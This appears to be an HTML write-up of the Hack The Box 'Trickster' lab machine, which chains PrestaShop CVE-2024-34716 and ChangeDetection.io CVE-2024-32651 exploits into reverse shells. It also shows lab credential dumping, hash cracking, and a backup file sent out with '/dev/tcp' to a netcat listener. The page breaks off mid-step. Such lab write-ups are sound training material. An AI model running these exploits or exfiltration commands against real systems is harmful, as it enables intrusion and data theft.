@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D3p4k-Trickster HTB</title>
+    <link rel="icon" type="image/png" href="https://labs.hackthebox.com/storage/avatars/0eff5f0d7d2208024e519e5abfb132d0.png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../writeup.css">
+    </head>
+<body>
+    <!-- Socials -->
+    <div class="socials">
+        <a href="https://www.linkedin.com" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="https://app.hackthebox.com/profile/1979344" target="_blank">
+            <svg style="width: 24px; height: 24px;" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <title>Hack The Box</title>
+                <path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z" fill="white"></path>
+            </svg>
+        </a>
+        <a href="https://github.com" target="_blank"><i class="fab fa-github"></i></a>
+    </div>
+
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">Trickster - Hack the box</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="../../index.html">Home</a></li>
+                    <li class="nav-item"><a class="nav-link" href="../../Writeup_all.html">Write-up</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Sections -->
+    <div class="container">
+        <section id="machine-info" class="section">   
+            <h2>Machine Info:</h2>
+            <p><strong>Trickster</strong> is a medium-difficulty Linux machine featuring a PrestaShop application vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-34716>CVE-2024-34716</a>.Exploiting this vulnerability grants access to the remote server as the `www-data` user. Further enumeration reveals PrestaShop configuration files containing database credentials, allowing us to dump and crack password hashes to obtain the password for user `james`. We can then SSH into the server as `james`. A Docker container running ChangeDetection.io is also present, vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-32651>CVE-2024-32651</a>, which can be exploited to gain a root shell inside the container. Inside the container, backup files from ChangeDetection.io reveal the password for user `adam`, which allows SSH access as `adam`. Finally, privilege escalation to root is achieved by exploiting <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-47268> CVE-2023-47268</a> in the PrusaSlicer tool. </p>
+            <img src="https://labs.hackthebox.com/storage/avatars/0eff5f0d7d2208024e519e5abfb132d0.png">
+        </section>
+
+        <section id="enumeration" class="section">
+    <h2>Enumeration:</h2>
+    <h3>Nmap:</h3>
+    <!-- Terminal Window: Rustscan Output -->
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>nmap -sC -sV 10.129.231.135 -oA nmap/Trickster
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 17:15 IST
+Nmap scan report for 10.129.231.135
+Host is up (0.040s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
+|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://trickster.htb/
+Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds</code></pre>
+        </div>
+    </div>
+    <p>I started the enumeration with an Nmap scan using <code>-sC</code> for default scripts and <code>-sV</code> for version detection. The target machine, <strong>10.129.231.135</strong>, was found to be online with two open ports: <strong>22 (SSH)</strong> and <strong>80 (HTTP)</strong>. The SSH service is running <strong>OpenSSH 8.9p1</strong> on Ubuntu, which could be useful for later exploitation if credentials are obtained. The web server is <strong>Apache 2.4.52</strong>, and the HTTP title suggests a redirect to <code>http://trickster.htb/</code>, indicating a possible <strong>virtual host configuration</strong>. This hints that adding the domain to <code>/etc/hosts</code> might be necessary for further web enumeration. The next step will involve exploring the website for potential vulnerabilities and gathering more information.</p>
+    <br><br>
+    <img src="./image.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p>Upon navigating the website, I discovered that clicking on the <strong>Shop</strong> navigation redirects to <code>shop.trickster.htb</code>.</p>
+    <img src="./image1.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+    <br><br>
+    <p>The shop appears to be built using <strong>PrestaShop</strong>. I researched vulnerabilities related to this platform but couldn&#x27;t find any that could be directly exploited.</p>
+    <p >PrestaShop is an <strong>open-source e-commerce web application</strong> designed to offer a seamless shopping cart experience for both merchants and customers. It is <strong>built with PHP</strong>, highly <strong>customizable</strong>, and supports major <strong>payment services</strong>. Additionally, it is <strong>translated into multiple languages</strong>, localized for various countries, and features a <strong>fully responsive design</strong> for both the front and back office.</p>
+    <br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+         <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://shop.trickster.htb/FUZZ -fs 283
+
+
+        /&#x27;___\  /&#x27;___\           /&#x27;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://shop.trickster.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 283
+________________________________________________
+
+.git                    [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 40ms]
+</code></pre></div></div>
+<p>While fuzzing <strong>shop.trickster.htb</strong>, I discovered the presence of a <code><strong>.git</strong></code><strong> directory</strong>, which indicates that the site&#x27;s Git repository might be accessible. This could potentially expose <strong>source code, configuration files, or sensitive credentials</strong> if not properly secured. The next step will be to enumerate the <code>.git</code> directory further to check for leaked information using tools like <code>git-dumper</code> or <code>GitTools</code>.</p>
+    <br><br>
+<img src="./image2.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+    <p>To further investigate the exposed <code><strong>.git</strong></code><strong> directory</strong>, I used <strong>GitHack</strong>, a tool designed to exploit <code>.git</code> folder disclosures. <strong>GitHack</strong> allows for the reconstruction of the source code while preserving the original directory structure. This can potentially reveal sensitive information such as <strong>configuration files, credentials, or even database details</strong>. Extracting and analyzing the recovered files could provide valuable insights for further exploitation.</p>
+    <br><br>
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Trickster/shop.trickster.htb]
+└─$ python3 /opt/GitHack/GitHack.py http://shop.trickster.htb/.git/
+&lt;SNIP&gt;
+[OK] admin634ewutrx1jgitlooaj/themes/new-theme/template/layout.tpl
+[OK] admin634ewutrx1jgitlooaj/themes/new-theme/template/light_display_layout.tpl
+[OK] admin634ewutrx1jgitlooaj/themes/new-theme/template/modal.tpl
+[OK] admin634ewutrx1jgitlooaj/themes/new-theme/tsconfig.json
+[OK] admin634ewutrx1jgitlooaj/themes/new-theme/template/page_header_toolbar.tpl
+[OK] autoload.php
+[OK] error500.html
+[OK] index.php
+[OK] init.php
+
+
+┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Trickster/shop.trickster.htb]
+└─$ ls -la
+total 228
+drwxrwxr-x 3 deepak deepak   4096 Feb  1 18:02 .
+drwxrwxr-x 4 deepak deepak   4096 Feb  1 18:02 ..
+drwxrwxr-x 8 deepak deepak   4096 Feb  1 18:02 admin634ewutrx1jgitlooaj
+-rw-rw-r-- 1 deepak deepak   1305 Feb  1 18:02 autoload.php
+-rw-rw-r-- 1 deepak deepak   2506 Feb  1 18:02 error500.html
+-rw-rw-r-- 1 deepak deepak   1169 Feb  1 18:02 index.php
+-rw-rw-r-- 1 deepak deepak   1256 Feb  1 18:02 init.php
+-rw-rw-r-- 1 deepak deepak    522 Feb  1 18:02 Install_PrestaShop.html
+-rw-rw-r-- 1 deepak deepak   5054 Feb  1 18:02 INSTALL.txt
+-rw-rw-r-- 1 deepak deepak 183862 Feb  1 18:02 LICENSES
+-rw-rw-r-- 1 deepak deepak    863 Feb  1 18:02 Makefile
+-rw-rw-r-- 1 deepak deepak   1538 Feb  1 18:02 .php-cs-fixer.dist.php</code></pre>
+</div></div>
+<p>Reading a few lines on the code and <code>/admin634ewutrx1jgitlooaj/</code> looks like the admin directory.</p><p>Entering <code>http://shop.trickster.htb/admin634ewutrx1jgitlooaj/</code> gives the admin login page. Version is <code>8.1.5</code>.</p>
+<br><br>
+<img src="./image3.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+</section>
+
+<section id="CVE-2024-34716" class="section">
+<h2><strong>CVE-2024-34716:</strong></h2>
+<p><strong>CVE-2024-34716</strong> is a <strong>Cross-Site Scripting (XSS) vulnerability</strong> affecting <strong>PrestaShop 8.1.5</strong>. An attacker can craft a <strong>malicious PNG file</strong> that, when viewed, executes JavaScript code to steal the victim&#x27;s cookies. These stolen cookies can then be used to <strong>upload a malicious </strong><code><strong>.zip</strong></code><strong> file</strong> and download a theme, ultimately leading to <strong>Remote Code Execution (RCE)</strong>. A <strong>public proof-of-concept (PoC)</strong> is available from the researcher who discovered the vulnerability, along with an improved version of the original exploit. For more details on the attack and exploitation process, refer to the research <a href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/">blog</a>.</p><p id="18d79dbf-6729-80da-acb6-df6802c853d1" class="">
+</p><p>The exploit for <strong>CVE-2024-34716</strong> is publicly available on GitHub:</p><p>🔗 <strong><a href="https://github.com/aelmokhtar/CVE-2024-34716">CVE-2024-34716 Exploit</a></strong></p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>python exploit.py --url &quot;http://shop.trickster.htb&quot; --email d3p4k@trickster.htb --local-ip 10.10.14.38 --admin-path &quot;admin634ewutrx1jgitlooaj&quot; 
+[X] Starting exploit with:
+    Url: http://shop.trickster.htb
+    Email: d3p4k@trickster.htb
+    Local IP: 10.10.14.38
+    Admin Path: admin634ewutrx1jgitlooaj
+[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.
+Serving at http.Server on port 5000
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:12345
+Ncat: Listening on 0.0.0.0:12345
+GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
+Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
+Response: 200 -
+10.129.231.135 - - [01/Feb/2025 18:22:56] &quot;GET /ps_next_8_theme_malicious.zip HTTP/1.1&quot; 200 -
+Ncat: Connection from 10.129.231.135:40740.
+Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 12:53:01 up  1:15,  0 users,  load average: 0.08, 0.19, 0.21
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#x27;t access tty; job control turned off
+$ whoami
+www-data
+$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+www-data@trickster:/$ ^Z
+zsh: suspended  python exploit.py --url &quot;http://shop.trickster.htb&quot; --email  --local-ip   
+                                                                                                                                                                                                                                              
+┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Trickster/CVE-2024-34716]
+└─$ stty raw -echo; fg  
+[1]  + continued  python exploit.py --url &quot;http://shop.trickster.htb&quot; --email  --local-ip   
+
+www-data@trickster:/$ 
+</code></pre></div></div>
+<p>After obtaining a <strong>www-data shell</strong>, I searched for configuration files and found <strong>database credentials</strong> in <code>prestashop/app/config/parameters.php</code>. This file typically stores <strong>sensitive information</strong>, including database connection details, which could be leveraged for further exploitation, such as <strong>privilege escalation or data extraction</strong>.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>www-data@trickster:~/prestashop/app/config$ cat parameters.php 
+&lt;SNIP&gt;
+&#x27;database_host&#x27; =&gt; &#x27;127.0.0.1&#x27;,
+    &#x27;database_port&#x27; =&gt; &#x27;&#x27;,
+    &#x27;database_name&#x27; =&gt; &#x27;prestashop&#x27;,
+    &#x27;database_user&#x27; =&gt; &#x27;ps_user&#x27;,
+    &#x27;database_password&#x27; =&gt; &#x27;prest@shop_o&#x27;,
+&lt;SNIP&gt;</code></pre></div></div>
+<br><br>
+<p>After logging into MySQL, I found the password hash of james in the ps_employee table.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>MariaDB [prestashop]&gt; select * from ps_employee;
++-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
+| id_employee | id_profile | id_lang | lastname | firstname | email               | passwd                                                       | last_passwd_gen     | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css    | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |
++-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
+|           1 |          1 |       1 | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25      | 2024-05-25    | 0000-00-00         | 0000-00-00       |                    1 | NULL                 | NULL     | default  | theme.css |           1 |        0 |       1 |      1 |  NULL |             5 |                        0 |                0 | 2025-02-01           | NULL                 | 0000-00-00 00:00:00     |                    0 |
+|           2 |          2 |       0 | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL            | NULL          | NULL               | NULL             |                    1 | NULL                 | NULL     | NULL     | NULL      |           0 |        0 |       1 |      0 |  NULL |             0 |                        0 |                0 | NULL                 | NULL                 | NULL                    |                    0 |
++-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
+2 rows in set (0.001 sec)
+</code></pre>
+</div></div>
+<p>Use <strong>Hashcat</strong> to crack the <strong>James</strong> hash.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>hashcat -m 3200 -a 0  james_hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz, 2845/5755 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
+
+$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6y...yunCmm
+Time.Started.....: Sat Feb  1 18:42:30 2025 (37 secs)
+Time.Estimated...: Sat Feb  1 18:43:07 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     1012 H/s (6.15ms) @ Accel:4 Loops:8 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 37056/14344385 (0.26%)
+Rejected.........: 0/37056 (0.00%)
+Restore.Point....: 37040/14344385 (0.26%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:8-16
+Candidate.Engine.: Device Generator
+Candidates.#1....: alyssa7 -&gt; Yankees
+Hardware.Mon.#1..: Temp: 76c Util: 98%
+
+Started: Sat Feb  1 18:41:34 2025
+Stopped: Sat Feb  1 18:43:09 2025
+</code></pre>
+</div></div>
+<p>After cracking the hash, use it to log in via <strong>SSH</strong> and retrieve the <strong>user.txt</strong> file.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>ssh james@trickster.htb                               
+The authenticity of host &#x27;trickster.htb (10.129.231.135)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;trickster.htb&#x27; (ED25519) to the list of known hosts.
+james@trickster.htb&#x27;s password: 
+Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
+james@trickster:~$ ls
+user.txt</code></pre>
+</div></div>
+</section>
+
+<section id="Lateral-Privilege Escalation" class="section">
+<h2>Lateral-Privilege Escalation:</h2><p>While running <code>ifconfig</code>, I discovered that <strong>Docker</strong> is running on the machine with the IP address <strong>172.17.0.1</strong>. This could provide additional avenues for exploration, such as <strong>container access</strong> or potential vulnerabilities within the Docker environment.</p>
+<br>
+<br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code >james@trickster:/tmp$ ifconfig 
+docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:79:6b:be:c2  txqueuelen 0  (Ethernet)
+        RX packets 304  bytes 13792 (13.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 994  bytes 48780 (48.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.129.231.135  netmask 255.255.0.0  broadcast 10.129.255.255
+        ether 00:50:56:b9:85:de  txqueuelen 1000  (Ethernet)
+        RX packets 48776  bytes 19038814 (19.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 40736  bytes 29885559 (29.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 304202  bytes 481522176 (481.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 304202  bytes 481522176 (481.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+veth0ed9ac6: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        ether 82:0e:62:df:eb:a1  txqueuelen 0  (Ethernet)
+        RX packets 230  bytes 12620 (12.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 984  bytes 48360 (48.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre>
+</div></div>
+<p>After running an <strong>Nmap scan</strong> on the Docker IP <strong>172.17.0.1</strong>, I discovered that port <strong>5000</strong> is open. This could indicate a service running on that port, possibly a web application or API. The next step will be to investigate this service further for any potential vulnerabilities or useful information.</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>james@trickster:~$ ./nmap -p- 172.17.0.2
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-10-14 18:42 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.17.0.2
+Host is up (0.00046s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+5000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds</code></pre>
+</div></div>
+<p>I set up <strong>port forwarding</strong> for the Docker container to access it on the <strong>localhost</strong>.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>ssh -L 5000:172.17.0.2:5000 james@trickster.htb
+james@trickster:~$</code></pre>
+</div></div>
+<p>Port <strong>5000</strong> is running <strong>ChangeDetection.io</strong>, which I accessed through my machine. The service provides notifications when a monitored site is updated, sending alerts via email, notifications, or apps like <strong>Telegram</strong> and <strong>WhatsApp</strong>. The webpage prompts for a login to interact with the service</p>
+<img src="./image4.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<p>Using James Credentials  we were able to login </p>
+<img src="./image5.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+</section>
+
+<section id="CVE-2024-32651" class="section">
+<h2>CVE-2024-32651:</h2>
+<p>Using the exploit available at <strong><a href="https://github.com/evgeni-semenov/CVE-2024-32651">CVE-2024-32651</a></strong>, we were able to gain <strong>root access</strong> to the Docker container. This vulnerability allowed us to escalate privileges and gain full control over the Docker environment.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code class="language-Shell">python3 cve-2024-32651.py --url http://localhost:5000/ --ip 10.10.14.38 --port 9001 --password &quot;alwaysandforever&quot;
+Obtained CSRF token: IjhjMjRjNWY2MzBiMWU5YTk3NzQwOWVjMDc5ZGU4YjZkNDU0Njk5YjMi.Z54rlA.aXQb7gaZ6u5jAjTjYHfqqtGaKto
+Logging in...
+[+] Login succesful
+Redirect URL: /edit/0745c8ca-2f7a-4de5-9b0b-7f288070e106?unpause_on_save=1
+Final request made.
+Spawning shell...
+[+] Trying to bind to :: on port 9001: Done
+[+] Waiting for connections on :::9001: Got connection from ::ffff:10.129.231.135 on port 55206
+Listening on port 9001...
+Connection received!
+[*] Switching to interactive mode
+root@a4b9a36ae7ff:/app# $  
+</code></pre>
+</div></div>
+<p>In the <strong>Docker root shell</strong>, I found a <strong>backup directory</strong> located at <code>/datastore/Backups</code>, which contains two <strong>zip files</strong>:</p><ul class="bulleted-list"><li style="list-style-type:disc"><code>changedetection-backup-20240830194841.zip</code></li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><code>changedetection-backup-20240830202524.zip</code></li></ul><p class="">I transferred both zip files to the <strong>attacker machine</strong> for further analysis and potential exploitation</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>root@a4b9a36ae7ff:/datastore/Backups# $ ls
+ls
+changedetection-backup-20240830194841.zip
+changedetection-backup-20240830202524.zip
+root@a4b9a36ae7ff:/datastore/Backups# 
+root@a4b9a36ae7ff:/datastore/Backups# $ cat changedetection-backup-20240830194841.zip &gt; /dev/tcp/10.10.14.38/7777
+&lt;ckup-20240830194841.zip &gt; /dev/tcp/10.10.14.38/7777
+</code></pre>
+</div></div>
+<p>netcat Listener </p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>nc -lvnp 7777 &gt; changedetection.zip     
+listening on [any] 7777 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.129.231.135] 52916
+</code></pre>
+</div>
+</div>
+<p>I unzipped the <strong>changedetection.zip</strong> file, which extracted a directory named <strong>b4a8b52d-651b-44bc-bbc6-f9e8c6590103/</strong> containing several files:</p><ul class="bulleted-list"><li style="list-style-type:disc"><strong>f04f0732f120c0cc84a993ad99decb2c.txt.br</strong></li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>history.txt</strong></li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>secret.txt</strong></li></ul><ul id="18d79dbf-6729-80c9-a846-ce952c7171ed" class="bulleted-list"><li style="list-style-type:disc"><strong>url-list.txt</strong></li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>url-list-with-tags.txt</strong></li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>url-watches.json</strong></li></ul><p class="">These files could contain valuable information related to the monitored URLs, history of changes, and potentially sensitive data such as credentials or configurations. The next step is to analyze these files for useful information.</p><
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>unzip changedetection.zip 
+Archive:  changedetection.zip
+   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
